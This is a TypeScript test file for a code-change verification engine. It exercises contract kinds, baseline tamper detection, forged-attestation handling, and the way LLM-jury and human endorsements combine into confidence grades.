    [`${ROOT}/src/index.ts`]: "export { a } from './a'\nexport { b } from './b'\n",
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
    [`${ROOT}/src/b.ts`]: "import { a } from './a'\nexport const b = a + 1\n",
    [`${ROOT}/test/a.test.ts`]: "import { a } from '../src/a'\nvoid a\n",
  }
}

function contractEngine(
  fs: MemoryFs,
  commands: FakeCommands,
  checks?: ConstructorParameters<typeof ProofEngine>[0]['checks'],
) {
  const base: ConstructorParameters<typeof ProofEngine>[0] = {
    root: ROOT,
    fs,
    commands,
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    impactGraphLimit: 1_000,
    checkTimeoutMs: 5_000,
    verifyBudgetMs: 20_000,
    concurrency: 2,
  }
  return new ProofEngine(checks === undefined ? base : { ...base, autoDiscover: false, checks })
}

test('ζ: behavior-preserving end to end — surface snapshot, then the downgrade', async () => {
  const fs = MemoryFs.of(surfaceProject())
  const engine = contractEngine(fs, new FakeCommands())

  const { baseline } = await engine.establishBaseline()
  assert.ok(Array.isArray(baseline.apiSurface) && baseline.apiSurface.length >= 3,
    `baseline carries the apiSurface snapshot: ${JSON.stringify(baseline.apiSurface)}`)

  // Internal-only edit: same exports, different body. The claim holds.
  fs.mutate(`${ROOT}/src/b.ts`, "import { a } from './a'\nexport const b = a + 2\n")
  const kept = await engine.verifyContract({
    changed: ['src/b.ts'],
    contract: { kind: 'behavior-preserving', claim: 'refactored b internals, no API change' },
  })
  assert.equal(kept.report.grade, 'proven')
  const keptSurface = kept.contract.obligations.find(o => o.id === 'api-surface-unchanged')
  assert.ok(keptSurface, 'api-surface-unchanged obligation present')
  assert.equal(keptSurface.met, true)
  assert.equal(kept.contract.kind, 'behavior-preserving')

  // Public face moves: a new export appears. The run is still green, but the
  // obligation fails and drags the grade down — the engine never co-signs
  // more than the contract allows.
  fs.mutate(`${ROOT}/src/a.ts`, 'export const a = 1\nexport const a2 = 2\n')
  const broken = await engine.verifyContract({
    changed: ['src/a.ts'],
    contract: { kind: 'behavior-preserving', claim: 'still preserving, honest' },
  })
  assert.equal(broken.report.grade, 'stale', 'a proven run with unmet obligations is capped at stale')
  assert.ok(broken.report.confidence !== undefined, 'the confidence number survives the downgrade')
  assert.equal(broken.report.confidenceBasis, 'full-coverage')
  const brokenSurface = broken.contract.obligations.find(o => o.id === 'api-surface-unchanged')
  assert.ok(brokenSurface)
  assert.equal(brokenSurface.met, false)
  assert.match(brokenSurface.detail, /a2/, 'the detail names the new symbol')
  // The contract summary rides the proof/verified boundary marker.
  assert.ok(fs.log.some(l => l.includes('proof/verified') && l.includes('"kind":"behavior-preserving"')),
    'chain marker carries the contract summary')
})

test('ζ: behavior-adding — new paths must be covered by a passing check', async () => {
  const make = () => MemoryFs.of({
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'demo', main: './src/index.ts' }),
    [`${ROOT}/src/index.ts`]: "export { a } from './a'\n",
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
  })

  // Covered: a check whose paths match the new file exists and passes.
  const coveredFs = make()
  const covered = contractEngine(coveredFs, new FakeCommands(), [
    { label: 'src tests', command: ['npm', 'test'], kind: 'test', paths: ['src/**'] },
  ])
  await covered.establishBaseline()
  coveredFs.mutate(`${ROOT}/src/new.ts`, 'export const n = 1\n')
  const good = await covered.verifyContract({
    changed: ['src/new.ts'],
    contract: { kind: 'behavior-adding', claim: 'added a new module' },
  })
  assert.equal(good.report.grade, 'proven')
  const goodPaths = good.contract.obligations.find(o => o.id === 'new-paths-covered')
  assert.ok(goodPaths)
  assert.equal(goodPaths.met, true)

  // Uncovered: the new file matches no check's paths — the obligation names it.
  const bareFs = make()
  const bare = contractEngine(bareFs, new FakeCommands(), [
    { label: 'a tests', command: ['npm', 'test'], kind: 'test', paths: ['src/a.ts'] },
  ])
  await bare.establishBaseline()
  bareFs.mutate(`${ROOT}/src/new.ts`, 'export const n = 1\n')
  const bad = await bare.verifyContract({
    changed: ['src/a.ts', 'src/new.ts'],
    contract: { kind: 'behavior-adding', claim: 'added a new module' },
  })
  assert.equal(bad.report.grade, 'stale')
  const badPaths = bad.contract.obligations.find(o => o.id === 'new-paths-covered')
  assert.ok(badPaths)
  assert.equal(badPaths.met, false)
  assert.match(badPaths.detail, /src\/new\.ts/, 'the detail names the uncovered file')
})

test('ζ: perf-budget — benchmark evidence is force-run and judged against budgetMs', async () => {
  const make = () => MemoryFs.of({
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'demo' }),
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
    [`${ROOT}/bench/run.ts`]: 'export const run = (): number => 1\n',
  })
  const checks: ConstructorParameters<typeof ProofEngine>[0]['checks'] = [
    { label: 'src tests', command: ['npm', 'test'], kind: 'test', paths: ['src/**'] },
    { label: 'bench', command: ['node', 'bench/run.ts'], kind: 'benchmark', paths: ['bench/**'] },
  ]

  // Over budget: the benchmark must run anyway (its paths never matched the
  // change set) and its duration fails the stated budget.
  const slowFs = make()
  const slowCommands = new FakeCommands()
    .on(argv => argv.includes('bench/run.ts'), { exitCode: 0, output: 'bench: 500ms', durationMs: 500 })
  const slow = contractEngine(slowFs, slowCommands, checks)
  await slow.establishBaseline()
  const callsAfterBaseline = slowCommands.calls.length
  const over = await slow.verifyContract({
    changed: ['src/a.ts'],
    contract: { kind: 'perf-budget', claim: 'no path got slower', budgetMs: 100 },
  })
  assert.equal(slowCommands.calls.length - callsAfterBaseline, 2,
    'the benchmark ran despite impact analysis not selecting it')
  assert.equal(over.report.grade, 'stale', 'green checks cannot carry an over-budget claim')
  const within = over.contract.obligations.find(o => o.id === 'within-budget')
  assert.ok(within)
  assert.equal(within.met, false)
  assert.match(within.detail, /500ms/)
  const evidence = over.contract.obligations.find(o => o.id === 'benchmark-evidence')
  assert.ok(evidence?.met, 'the forced benchmark run produced decisive evidence')

  // Within budget: fresh workspace, fresh engine, fast benchmark.
  const fastFs = make()
  const fastCommands = new FakeCommands()
    .on(argv => argv.includes('bench/run.ts'), { exitCode: 0, output: 'bench: 50ms', durationMs: 50 })
  const fast = contractEngine(fastFs, fastCommands, checks)
  await fast.establishBaseline()
  const okRun = await fast.verifyContract({
    changed: ['src/a.ts'],
    contract: { kind: 'perf-budget', claim: 'no path got slower', budgetMs: 100 },
  })
  assert.equal(okRun.report.grade, 'proven')
  assert.ok(okRun.contract.obligations.every(o => o.met), 'every perf-budget obligation met')
})

test('ζ: docs-only — the jury path runs no checks and caps its own confidence', async () => {
  const fs = MemoryFs.of({
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'demo' }),
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
    [`${ROOT}/docs/guide.md`]: '# guide\n',
  })
  const commands = new FakeCommands()
  const engine = contractEngine(fs, commands, [
    { label: 'src tests', command: ['npm', 'test'], kind: 'test', paths: ['src/**'] },
  ])
  await engine.establishBaseline()

  const callsBefore = commands.calls.length
  const outcome = await engine.verifyContract({
    changed: ['docs/guide.md'],
    contract: {
      kind: 'docs-only',
      claim: 'rewrote the guide',
      review: 'Replaced the outdated CLI flags section with the current ones; no code was touched.',
    },
  })
  assert.equal(commands.calls.length, callsBefore, 'a docs-only claim executes zero commands')
  assert.equal(outcome.report.grade, 'proven')
  assert.equal(outcome.report.confidence, 0.8, 'jury confidence sits exactly at the cap')
  assert.equal(outcome.report.confidenceBasis, 'jury-only')
  assert.equal(outcome.checks.length, 0)
  assert.equal(outcome.selection.affected.length, 0)
  assert.equal(outcome.contract.juryConfidenceCap, 0.8)
  assert.ok(fs.log.some(l => l.includes('claim/jury')), 'the jury verdict is a chain marker')
  assert.match(proofNarrative(outcome.report), /PROVEN \(p≈0\.80, jury evidence — self-attestation is capped\)/)

  // A code file sneaking into a docs-only claim is caught — still without
  // running anything: the obligation, not a check, does the catching.
  const mixed = await engine.verifyContract({
    changed: ['docs/guide.md', 'src/a.ts'],
    contract: { kind: 'docs-only', claim: 'just docs', review: 'honest review text' },
  })
  assert.equal(commands.calls.length, callsBefore, 'even a failing docs-only claim runs no commands')
  assert.equal(mixed.report.grade, 'stale')
  assert.equal(mixed.report.confidenceBasis, 'jury-only')
  const docs = mixed.contract.obligations.find(o => o.id === 'docs-only-changes')
  assert.ok(docs)
  assert.equal(docs.met, false)
  assert.match(docs.detail, /src\/a\.ts/)
})

test('ζ: a pre-ζ baseline without apiSurface fails behavior-preserving honestly', async () => {
  const fs = MemoryFs.of(surfaceProject())
  const engine = contractEngine(fs, new FakeCommands())
  await engine.establishBaseline()

  // Simulate a baseline an OLDER engine wrote: strip the surface attachment,
  // then re-record the stripped file's digest exactly the way that engine's
  // saveBaseline would have. (H-23/F2 make the naive hand-strip — mutating
  // the file while the chain remembers a different digest — a loud tamper
  // event instead; that path has its own test below.) The rest of the file
  // stays byte-identical.
  const raw = await fs.readFile(`${ROOT}/.proof/baseline.json`)
  assert.ok(raw !== undefined)
  const parsed = JSON.parse(raw) as { apiSurface?: unknown }
  assert.ok(Array.isArray(parsed.apiSurface), 'sanity: the fresh baseline does carry a surface')
  delete parsed.apiSurface
  const stripped = JSON.stringify(parsed, null, 2)
  await fs.writeFile(`${ROOT}/.proof/baseline.json`, stripped)
  await engine.storeView.mark('baseline/saved', { digest: sha256(stripped), bytes: stripped.length })
  // v0.24 (Y-H-09) fixture fidelity: the old engine's saveBaseline ALWAYS
  // checkpointed right after its marker — a baseline-defining marker with no
  // boundary behind it is the absorption shape, and the fixture must model
  // the honest writer, not the attacker.
  await engine.storeView.checkpoint()
  assert.equal((await engine.audit()).chain.baselineTampered, false,
    'the simulated old-version baseline is internally consistent — no tamper charge')

  fs.mutate(`${ROOT}/src/b.ts`, "import { a } from './a'\nexport const b = a + 2\n")
  const outcome = await engine.verifyContract({
    changed: ['src/b.ts'],
    contract: { kind: 'behavior-preserving', claim: 'internal refactor only' },
  })
  const surface = outcome.contract.obligations.find(o => o.id === 'api-surface-unchanged')
  assert.ok(surface)
  assert.equal(surface.met, false, 'an un-comparable surface is never a pass')
  assert.match(surface.detail, /baseline/, 'the detail tells the user to rebuild the baseline')
  assert.equal(outcome.report.grade, 'stale')
  assert.equal(outcome.degraded, undefined, 'an honest old baseline is a downgrade, not a degradation')
})

test('H23: a baseline that fails its chain-recorded digest degrades the verify loudly', async () => {
  // The attack D1/C1 pinned: strip a field from baseline.json while the chain
  // remembers the original bytes' digest. F2's loader refuses the file, and
  // (this fix) the verify consumes the audit's baselineTampered channel — the
  // run is flagged degraded, the outcome and the boundary marker both carry
  // the tamper fact, and no grade is minted against the suspect bytes.
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands()
  const engine = makeEngine(fs, commands)
  await engine.establishBaseline()
  const raw = await fs.readFile(`${ROOT}/.proof/baseline.json`)
  assert.ok(raw !== undefined)
  const parsed = JSON.parse(raw) as { scriptDigests?: unknown }
  delete parsed.scriptDigests
  fs.mutate(`${ROOT}/.proof/baseline.json`, JSON.stringify(parsed, null, 2))
  assert.equal((await engine.audit()).chain.baselineTampered, true, 'sanity: the audit sees it')

  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(outcome.baselineTampered, true, 'the outcome names the tampered baseline')
  assert.equal(outcome.degraded, true, 'the run is degraded — it cannot trust its comparisons')
  assert.equal(outcome.report.grade, 'no-baseline', 'no trustworthy anchor means no baseline to judge against')
  assert.ok(fs.log.some(l => l.includes('proof/verified') && l.includes('"baselineTampered":true')),
    'the boundary marker carries the tamper fact')

  // The honest remedy is loud too: re-anchoring over a tampered predecessor
  // records that it superseded suspect bytes (H-23's establishBaseline leg).
  commands.on(() => true, { exitCode: 0, output: 'green' })
  await engine.establishBaseline()
  assert.ok(fs.log.some(l => l.includes('baseline/established') && l.includes('"supersededTampered":true')),
    'the healing anchor records what it replaced')
})

// -- κ: graded evidence fused into confidence and contracts --------------------

/** A B-class jury verdict seeded straight onto the chain, as the attest marker writes it. */
async function seedJuryAttestation(
  engine: ProofEngine,
  claim: string,
  over: { gen: number; verdict: 'uphold' | 'reject' | 'abstain'; probability: number },
): Promise<void> {
  // The marker payload is {label, ...data}; ι's parser keys on `kind`, so the
  // data carries it too. `at` is epoch millis supplied by the caller.
  await engine.storeView.mark('attest/jury', {
    kind: 'attest/jury',
    claimId: claimIdOf(claim),
    gen: over.gen,
    prompt: `Judge the claim: "${claim}"`,
    rubricVersion: 'jury-rubric/v1',
    model: 'jury-test-model',
    independence: 'fresh-context',
    verdict: over.verdict,
    probability: over.probability,
    output: 'verdict rendered by the seeded jury',
    at: 1_767_225_600_000,
  })
}

/** A C-class human decision seeded straight onto the chain. */
async function seedHumanAttestation(
  engine: ProofEngine,
  claim: string,
  over: { gen: number; decision: 'endorse' | 'reject' },
): Promise<void> {
  await engine.storeView.mark('attest/human', {
    kind: 'attest/human',
    claimId: claimIdOf(claim),
    gen: over.gen,
    approver: 'reviewer-1',
    approvedAt: 1_767_225_600_000,
    scope: { claim, evidenceRoot: null },
    decision: over.decision,
  })
}

test('κ: llm-jury — a chain-seeded B-class uphold certifies with zero commands', async () => {
  const fs = MemoryFs.of(surfaceProject())
  const commands = new FakeCommands()
  const engine = contractEngine(fs, commands)
  await engine.establishBaseline()

  const claim = 'refactored b internals; an independent jury reviewed the diff'
  await seedJuryAttestation(engine, claim, { gen: 0, verdict: 'uphold', probability: 0.99 })

  const callsBefore = commands.calls.length
  const outcome = await engine.verifyContract({
    changed: ['src/b.ts'],
    contract: { kind: 'llm-jury', claim },
  })
  assert.equal(commands.calls.length, callsBefore, 'an llm-jury claim executes zero commands')
  assert.equal(outcome.checks.length, 0)
  assert.equal(outcome.selection.affected.length, 0, 'llm-jury never goes through check selection')

  // Confidence is exactly the class-weighted factor: 0.99^0.7 ≈ 0.993.
  assert.ok(outcome.report.confidence !== undefined)
  assert.ok(Math.abs(outcome.report.confidence - 0.99 ** 0.7) < 1e-12,
    `confidence ${outcome.report.confidence} vs 0.99^0.7`)
  assert.equal(outcome.report.grade, 'proven', '0.993 clears the 0.97 certify target')
  assert.equal(outcome.report.confidenceBasis, 'jury-only', 'no machine record, a B witness: jury-only')
  assert.ok(outcome.contract.obligations.every(o => o.met), 'every llm-jury obligation met')

  // The contract summary carries the fused witness.
  assert.ok(outcome.contract.attestations !== undefined && outcome.contract.attestations.length === 1)
  const summary = outcome.contract.attestations?.[0]
  assert.equal(summary?.class, 'B')
  assert.equal(summary?.gen, 0)
  assert.equal(summary?.verdict, 'uphold')
  assert.ok(summary !== undefined && Math.abs(summary.factor - 0.99 ** 0.7) < 1e-12)

  // The boundary marker summarises what the grade rode on (no prompt/output dump).
  assert.ok(fs.log.some(l => l.includes('claim/jury') && l.includes('"verdict":"uphold"') && l.includes('jury-test-model')),
    'claim/jury marker carries the attestation summary')
})

test('κ (H32): a suspect-flagged attestation is withheld from the fusion and counted in the narrative', async () => {
  const fs = MemoryFs.of(surfaceProject())
  const engine = contractEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  const claim = 'the retry loop honours cancellation'
  // One clean witness at gen 0...
  await seedJuryAttestation(engine, claim, { gen: 0, verdict: 'uphold', probability: 0.99 })
  // ...and a suspect-flagged IMPOSTOR at a higher gen, appended the raw way
  // (the evidence layer's channel is structural — the engine reads the flag
  // wherever a writer puts it, envelope or payload). Without the flag this
  // gen-1 reject@0.99 would WIN the appeal race and collapse the claim; the
  // flag says its chain position is not corroborated, so it is not testimony.
  const flagged = JSON.stringify({
    v: 2,
    kind: 'marker',
    at: '2026-10-06T00:00:00.000Z',
    prev: 'not-the-real-tail',
    suspect: true,
    payload: {
      label: 'attest/jury',
      kind: 'attest/jury',
      claimId: claimIdOf(claim),
      gen: 1,
      prompt: 'impostor deliberation',
      rubricVersion: 'jury-rubric/v1',
      model: 'impostor-model',
      independence: 'fresh-context',
      verdict: 'reject',
      probability: 0.99,
      output: '{"verdict":"reject","probability":0.99}',
      at: 1_767_225_600_000,
    },
  })
  await fs.appendLine(`${ROOT}/.proof/evidence.jsonl`, flagged)

  const outcome = await engine.verifyContract({ contract: { kind: 'llm-jury', claim } })
  // v0.23 (X-H-09): the impostor's line broke the chain (`prev` points
  // nowhere), so the chain under this verdict fails its own audit and the
  // grade caps at stale — but the H32 story this test pins is unchanged and
  // still visible below: the fusion was decided by the CLEAN gen-0 witness
  // (the impostor never reached it).
  assert.equal(outcome.report.grade, 'stale', 'the chain the impostor broke fails its own audit — the grade caps at stale')
  assert.equal(outcome.auditFailed, true, 'the cap is the audit failure, not a judgment about the claim')
  assert.equal(outcome.contract.attestations?.length, 1)
  assert.equal(outcome.contract.attestations?.[0]?.gen, 0)
  // v0.24 (Y-H-03): the fusion pool is the verified view's — a non-degraded
  // generation simply does not admit suspect lines, so the per-verdict
  // `suspectAttestations` count is no longer minted. The withheld testimony
  // stays visible through the store's GLOBAL channel (`audit().chain.
  // suspectMarkers`), and a legacy all-suspect generation reads degraded
  // and says so on the marker instead (see the V3-M2 pin below).
  assert.ok(!fs.log.some(l => l.includes('"claim/jury"') && l.includes('"suspectAttestations"')),
    'the retired per-verdict count is not minted')
  assert.ok(!fs.log.some(l => l.includes('"claim/jury"') && l.includes('"attestationsDegraded"')),
    'this chain is not a degraded generation — the fallback flag stays absent')
  const logLines = ((await fs.readFile(`${ROOT}/.proof/evidence.jsonl`)) ?? '').split('\n').filter(l => l.trim().length > 0)
  const impostorIndex = logLines.findIndex(l => l.includes('impostor-model'))
  assert.ok(impostorIndex >= 0, 'fixture: the impostor line is on the log')
  assert.ok((await engine.audit()).chain.suspectMarkers?.includes(impostorIndex),
    'the impostor line is flagged suspect on the audit\'s global channel — the withholding is visible where the log\'s integrity is judged')})

test('ζ (M04): the jury paths carry the degraded flag when git facts were unavailable', async () => {
  // H6's honesty only reached the machine path: a git-blind workspace used
  // to hand back a capped-proven docs-only verdict with no flag at all,
  // judging an unobservable change set as "documentary". Both jury paths now
  // surface the blindness on the outcome and the claim/jury marker.
  const fs = MemoryFs.of(surfaceProject())
  const ws = new FakeWorkspace(ROOT)
  ws.gitAvailableValue = false
  const engine = new ProofEngine({
    root: ROOT, fs, commands: new FakeCommands(), workspace: ws,
    clock: new FakeClock(), impactGraphLimit: 1_000,
  })
  const docs = await engine.verifyContract({ contract: { kind: 'docs-only', claim: 'only docs moved' } })
  assert.equal(docs.degraded, true, 'the docs-only path surfaces the blindness')
  const jury = await engine.verifyContract({ contract: { kind: 'llm-jury', claim: 'only docs moved' } })
  assert.equal(jury.degraded, true, 'the llm-jury path does too')
  assert.ok(fs.log.filter(l => l.includes('"claim/jury"') && l.includes('"degraded":true')).length >= 2,
    'both claim/jury markers record the degraded resolution')
})

test('κ: appeal override — the highest-gen attestation decides, in both directions', async () => {
  const fs = MemoryFs.of(surfaceProject())
  const commands = new FakeCommands()
  const engine = contractEngine(fs, commands)
  await engine.establishBaseline()
  const claim = 'appealable claim'

  // Rejected first (gen 0): a reject at p=0.2 collapses the fused confidence.
  await seedJuryAttestation(engine, claim, { gen: 0, verdict: 'reject', probability: 0.2 })
  const rejected = await engine.verifyContract({
    changed: ['src/b.ts'],
    contract: { kind: 'llm-jury', claim },
  })
  assert.equal(rejected.report.grade, 'stale')
  assert.ok(rejected.report.confidence !== undefined)
  assert.ok(Math.abs(rejected.report.confidence - 0.2 ** 0.7) < 1e-12, 'reject factor is 0.2^0.7')

  // Appealed and upheld (gen 1): the appeal overrides, confidence follows the NEW verdict.
  await seedJuryAttestation(engine, claim, { gen: 1, verdict: 'uphold', probability: 0.99 })
  const upheld = await engine.verifyContract({
    changed: ['src/b.ts'],
    contract: { kind: 'llm-jury', claim },
  })
  assert.equal(upheld.report.grade, 'proven')
  assert.ok(Math.abs((upheld.report.confidence ?? 0) - 0.99 ** 0.7) < 1e-12,
    'the active attestation is the gen-1 uphold, not the gen-0 reject')
  assert.equal(upheld.contract.attestations?.[0]?.gen, 1)
  assert.equal(upheld.contract.attestations?.[0]?.verdict, 'uphold')

  // Appealed back to reject (gen 2): the newest verdict wins again.
  await seedJuryAttestation(engine, claim, { gen: 2, verdict: 'reject', probability: 0.2 })
  const overturned = await engine.verifyContract({
    changed: ['src/b.ts'],
    contract: { kind: 'llm-jury', claim },
  })
  assert.equal(overturned.report.grade, 'stale')
  assert.equal(overturned.contract.attestations?.[0]?.verdict, 'reject')
  const upholds = overturned.contract.obligations.find(o => o.id === 'jury-upholds')
  assert.ok(upholds)
  assert.equal(upholds.met, false, 'a reject cannot satisfy jury-upholds')
})

/**
 * Six checks, each failing at baseline and passing at verify: every posterior
 * lands at 0.99, so the machine confidence is 0.99^6 ≈ 0.9415 — a certification
 * sitting ~0.03 under the 0.97 target. The Class C endorse then fuses in.
 */
function endorsementProject(): Record<string, string> {
  const files: Record<string, string> = {
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'demo', main: './src/index.ts' }),
    [`${ROOT}/src/index.ts`]: '',
  }
  for (const name of ['a', 'b', 'c', 'd', 'e', 'f']) {
    files[`${ROOT}/src/${name}.ts`] = `export const ${name} = 1\n`
    files[`${ROOT}/src/index.ts`] += `export { ${name} } from './${name}'\n`
  }
  return files
}

const ENDORSEMENT_CHECKS = ['a', 'b', 'c', 'd', 'e', 'f'].map(name => ({
  label: `${name} tests`, command: ['npm', 'run', '--silent', name], kind: 'test' as const, paths: [`src/${name}.ts`],
}))

const ENDORSEMENT_CHANGED = ['a', 'b', 'c', 'd', 'e', 'f'].map(name => `src/${name}.ts`)

test('κ: a Class C endorsement fuses into a machine certification — and a rejection drags it down', async () => {
  const claim = 'refactored six modules, behaviour preserved'

  const setup = async (fs: MemoryFs, commands: FakeCommands): Promise<ProofEngine> => {
    const engine = contractEngine(fs, commands, ENDORSEMENT_CHECKS)
    // Baseline: every check fails (decisively — the baseline still anchors).
    commands.on(() => true, { exitCode: 1, output: 'red' })
    await engine.establishBaseline()
    // Verify: everything heals — six `fixed` verdicts, full coverage.
    commands.on(() => true, { exitCode: 0, output: 'green' })
    return engine
  }

  const verify = async (engine: ProofEngine): Promise<Awaited<ReturnType<ProofEngine['verifyContract']>>> =>
    engine.verifyContract({ changed: ENDORSEMENT_CHANGED, contract: { kind: 'behavior-preserving', claim } })

  // Control: no attestation — pure machine number.
  const control = await setup(MemoryFs.of(endorsementProject()), new FakeCommands())
  const machineRun = await verify(control)
  const machine = machineRun.report.confidence
  assert.ok(machine !== undefined && machine > 0.9 && machine < 0.97,
    `machine confidence sits ~0.03 under the target (got ${machine})`)
  assert.equal(machineRun.report.grade, 'proven', 'full green coverage: the machine run itself proves')
  assert.equal(machineRun.report.confidenceBasis, 'full-coverage')
  assert.equal(machineRun.contract.attestations, undefined, 'no witness on chain: no summary')

  // Endorsement: risk acceptance, not certainty transfer. The number the
  // machines measured is what stands; the basis records who took the residual.
  const endorseFs = MemoryFs.of(endorsementProject())
  const endorse = await setup(endorseFs, new FakeCommands())
  await seedHumanAttestation(endorse, claim, { gen: 0, decision: 'endorse' })
  const endorsed = await verify(endorse)
  assert.equal(endorsed.report.grade, 'proven', 'the machine grade survives; endorsement never demotes')
  assert.equal(endorsed.report.confidenceBasis, 'attested', 'machine + witness: attested')
  assert.ok(endorsed.report.confidence !== undefined && machine !== undefined)
  assert.ok(Math.abs(endorsed.report.confidence - machine) < 1e-12,
    `endorse leaves the machine number untouched (got ${endorsed.report.confidence}, machine ${machine})`)
  assert.deepEqual(endorsed.contract.attestations, [
    { class: 'C', gen: 0, verdict: 'endorse', factor: Math.pow(0.95, 0.9) },
  ])
  assert.ok(endorseFs.log.some(l => l.includes('proof/verified') && l.includes('"verdict":"endorse"')),
    'the boundary marker carries the fused witness')
  assert.match(proofNarrative(endorsed.report), /PROVEN \(p≈0\.\d+, machine \+ B\/C attested\)/)

  // Rejection: the number collapses under the human's error probability, and
  // the symmetric lock demotes the grade — a claim a sworn witness denies
  // cannot keep a grade the number no longer supports.
  const reject = await setup(MemoryFs.of(endorsementProject()), new FakeCommands())
  await seedHumanAttestation(reject, claim, { gen: 0, decision: 'reject' })
  const rejected = await verify(reject)
  assert.equal(rejected.report.confidenceBasis, 'attested')
  assert.ok(rejected.report.confidence !== undefined && machine !== undefined)
  assert.ok(Math.abs(rejected.report.confidence - machine * 0.05 ** 0.9) < 1e-12,
    `reject factor is (1-0.95)^0.9 (got ${rejected.report.confidence})`)
  assert.ok((rejected.report.confidence ?? 1) < 0.1, 'a human rejection collapses the certified number')
  assert.equal(rejected.report.grade, 'stale', 'an explicit rejection locks the grade down')
})

test('κ (H3): endorsement cannot pay for unrun checks — the unlock requires completed work', async () => {
  const claim = 'docs and internals tidied, no behaviour change'
  // The semantics this case pins were REVERSED by the 2026-10-06 deep read:
  // a budget-starved run skips every check, the machine grade is honestly
  // stale — and the old unlock lifted that stale to `proven` on one human
  // endorsement, i.e. the endorsement paid for work that never happened. The
  // honest rule: an endorsement accepts the residual risk of work that DID
  // happen (a completed run sitting just under the certify target); six
  // skipped checks are not residual risk, they are missing work. (H12
  // additionally keeps a starved baseline from anchoring, so the baseline is
  // established with a healthy budget first and only the verification is
  // starved.)
  const fs = MemoryFs.of(endorsementProject())
  const anchoring = contractEngine(fs, new FakeCommands(), ENDORSEMENT_CHECKS)
  await anchoring.establishBaseline()
  const starved = new ProofEngine({
    root: ROOT, fs, commands: new FakeCommands(), workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(), autoDiscover: false, checks: ENDORSEMENT_CHECKS,
    verifyBudgetMs: 1,
  })
  const starvedRun = await starved.verifyContract({ changed: ENDORSEMENT_CHANGED, contract: { kind: 'behavior-preserving', claim } })
  assert.equal(starvedRun.report.grade, 'stale', 'budget starvation is stale before any witness speaks')
  assert.equal(starvedRun.report.summary.regressions, 0)
  assert.equal(starvedRun.report.unverified.length, 6, 'every check is unverified — nothing ran')

  // Seed the SAME claim's endorsement on the same chain and re-verify: the
  // witness is recorded and fused into the number, but the grade does not
  // move — no unlock without completed work.
  await seedHumanAttestation(starved, claim, { gen: 0, decision: 'endorse' })
  const endorsed = await starved.verifyContract({ changed: ENDORSEMENT_CHANGED, contract: { kind: 'behavior-preserving', claim } })
  assert.equal(endorsed.report.grade, 'stale', 'an endorsement buys zero unrun checks')
  assert.equal(endorsed.report.confidenceBasis, 'attested', 'the witness is still honestly fused into the number')
  assert.equal(endorsed.report.summary.regressions, 0)

  // But an unmet obligation is missing work, not residual risk: endorsement
  // must not pay for it (grow the API surface, keep the endorsement seeded).
  const tamperedFs = MemoryFs.of(endorsementProject())
  const tampered = contractEngine(tamperedFs, new FakeCommands(), ENDORSEMENT_CHECKS)
  await tampered.establishBaseline()
  tamperedFs.mutate('/ws/src/a.ts', 'export const a = 1\nexport const a2 = 2\n')
  await seedHumanAttestation(tampered, claim, { gen: 0, decision: 'endorse' })
  const paid = await tampered.verifyContract({ changed: ENDORSEMENT_CHANGED, contract: { kind: 'behavior-preserving', claim } })
  assert.notEqual(paid.report.grade, 'proven', 'endorsement cannot buy off an unmet obligation')
})

test('κ (H4): endorsement cannot wash a vanished definition — the pool must be whole', async () => {
  // Reversal of the 2026-10-06 runtime PoC (a6-check3/d1-a6): delete a
  // baseline check's definition, verify honestly grades `stale` (vanished),
  // and ONE endorsement lifted the stale straight to `proven` — while the
  // report still carried the vanished id, contradicting itself. The unlock
  // now demands the pool be whole (and the script bodies match the baseline;
  // the drifted door rides the same gate as regression armor for the day a
  // confidence-tiered path makes it reachable).
  const claim = 'cleanup: the dead b package is gone'
  const fs = MemoryFs.of(driftProject())
  const engine = driftEngine(fs, new FakeCommands())
  await engine.establishBaseline()

  // b's definition vanishes: discovery no longer finds the package.
  fs.files.delete(`${ROOT}/packages/b/package.json`)
  await seedHumanAttestation(engine, claim, { gen: 0, decision: 'endorse' })

  const outcome = await engine.verifyContract({
    changed: ['packages/a/src/a.ts'],
    contract: { kind: 'behavior-preserving', claim },
  })
  assert.ok(outcome.report.vanished?.length === 1, 'the deleted definition surfaces as vanished')
  assert.equal(outcome.vanished?.length, 1, 'the outcome carries it too')
  assert.equal(outcome.report.grade, 'stale', 'a hole in the pool is missing work, not residual risk')
  assert.equal(outcome.report.confidenceBasis, 'attested', 'the endorsement IS fused into the number — it just buys no grade')

  // The same pool, now with a DRIFTED body added on top: still no unlock,
  // and the drift fact rides the outcome and the marker.
  fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: 'node -e ""' } }))
  const driftedRun = await engine.verifyContract({
    changed: ['packages/a/src/a.ts'],
    contract: { kind: 'behavior-preserving', claim },
  })
  assert.ok(driftedRun.scriptDrift !== undefined && driftedRun.scriptDrift.length === 1,
    'the rewritten body is detected on the same chain')
  assert.equal(driftedRun.report.grade, 'stale', 'vanished + drifted + endorsed is still missing work, not residual risk')
})

test('κ: plain verify stays pure machine — chain attestations never touch it', async () => {
  const runOnce = async (withAttestation: boolean) => {
    const fs = MemoryFs.of(waveProject())
    const commands = new FakeCommands()
    const engine = waveEngine(fs, commands)
    await engine.establishBaseline()
    if (withAttestation) {
      // A hostile on-chain witness: a B-class rejection at p=0.2. verify()
      // must not even read it.
      await seedJuryAttestation(engine, 'the wave workspace is healthy', { gen: 0, verdict: 'reject', probability: 0.2 })
    }
    return engine.verify({ changed: WAVE_CHANGED })
  }
  const plain = await runOnce(false)
  const attested = await runOnce(true)
  assert.strictEqual(attested.report.confidence, plain.report.confidence,
    'confidence is byte-identical with a rejection on chain')
  assert.strictEqual(attested.report.confidenceBasis, plain.report.confidenceBasis,
    'the basis never becomes attested on the plain verify path')
  assert.equal(attested.report.grade, plain.report.grade)
  assert.equal(JSON.stringify(attested.schedule), JSON.stringify(plain.schedule))
})

// -- π: PTC synthesis — the conjure request/execution protocol ------------------
//
// Real-process tests mirror 07/14: a scratch workspace under
